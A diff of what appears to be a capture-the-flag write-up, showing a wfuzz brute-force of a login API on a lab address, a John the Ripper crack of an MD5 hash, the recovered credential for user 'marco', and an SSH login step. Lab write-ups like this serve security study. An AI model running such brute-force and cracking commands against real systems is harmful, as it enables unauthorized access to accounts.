@@ -36,16 +36,13 @@ password md5 encoded
 >wfuzz -w final_hash.txt -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.10.200.52/api/login --hw 4
 
 > john hash --wordlist=Final_wordlist.txt --format=Raw-md5
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
-Warning: no OpenMP support for this hash type, consider --fork=4
-Press 'q' or Ctrl-C to abort, almost any other key for status
-# savoia21!        (?)
+
+savoia21!        (?)
 
 
 ## {marco:savoia21!}
 
-# connect SSH
+#### connect SSH
 
 > ssh marco@{ip}
 
